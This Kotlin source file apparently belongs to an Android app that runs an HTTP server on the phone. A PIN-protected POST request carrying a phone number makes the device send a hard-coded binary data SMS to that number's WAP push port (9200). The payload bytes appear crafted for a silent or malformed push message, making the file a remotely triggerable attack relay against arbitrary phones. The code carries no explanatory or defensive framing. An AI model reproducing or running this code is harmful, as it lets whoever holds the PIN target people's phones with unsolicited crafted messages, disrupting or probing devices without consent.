package com.malwareslayer.main.engine

import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*

import io.ktor.server.plugins.defaultheaders.*
import io.ktor.server.plugins.contentnegotiation.*

import io.ktor.serialization.kotlinx.json.*

import android.widget.TextView

import android.app.PendingIntent

import android.telephony.SmsManager
import io.ktor.util.*
import kotlinx.serialization.json.Json
import java.lang.Exception


fun Application.setup(pin: String, viewer: TextView, sent: PendingIntent, delivered: PendingIntent) {
    install(DefaultHeaders)
    install(ContentNegotiation) {
        json()
    }
    install(KeyMiddleware) {
        set(pin)
    }

    routing {
        post("/") {
            val phone: Phone = call.receive<Phone>()

            val error: Error = Json.decodeFromString(call.attributes[AttributeKey<String>("error")])

            if (error.message.isNotEmpty()) {
                call.respond(HttpStatusCode.fromValue(error.code), error.message)

                return@post
            }

            if (!phone.number.startsWith("+")) {
                call.respond(HttpStatusCode.BadRequest, "Malformed JSON: Invalid Format Number")

                return@post
            }

            val payload = byteArrayOf(0x0A, 0x06, 0x03, 0xB0.toByte(), 0xAF.toByte(),
                0x82.toByte(), 0x03, 0x06, 0x6A, 0x00, 0x05)

            if (phone.number.length <= 10) {
                call.respond(HttpStatusCode.BadRequest, "Malformed JSON: Invalid Length Number")

                return@post
            }

            try {
                SmsManager.getDefault().sendDataMessage(
                    phone.number, null, 9200, payload, sent, delivered)
            } catch (e: Exception) {
                call.respond(HttpStatusCode.InternalServerError, "${e.message}")

                return@post
            }

            viewer.append("${call.request.local.remoteAddress} -- ${phone.number}\n")

            call.respond(HttpStatusCode.OK)
        }
    }
}
